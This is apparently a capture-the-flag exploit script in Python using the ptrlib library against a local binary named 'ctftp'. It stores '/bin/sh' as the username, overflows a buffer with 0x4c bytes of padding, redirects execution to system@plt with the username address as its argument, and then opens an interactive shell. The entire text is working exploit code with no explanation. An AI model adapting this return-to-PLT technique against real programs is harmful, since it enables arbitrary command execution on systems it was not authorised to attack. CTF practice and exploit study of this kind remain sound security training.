from ptrlib import *

elf = ELF("./ctftp")
sock = Process("./ctftp")

payload = b'dummy'
payload += b'\x00' * (0x4c - len(payload))
payload += p32(elf.plt('system'))
payload += p32(0xdeadbeef)
payload += p32(elf.symbol('username'))

sock.sendafter(": ", "/bin/sh\n")
sock.sendlineafter("> ", "2")
sock.sendafter(": ", payload)
sock.recvline()

sock.interactive()
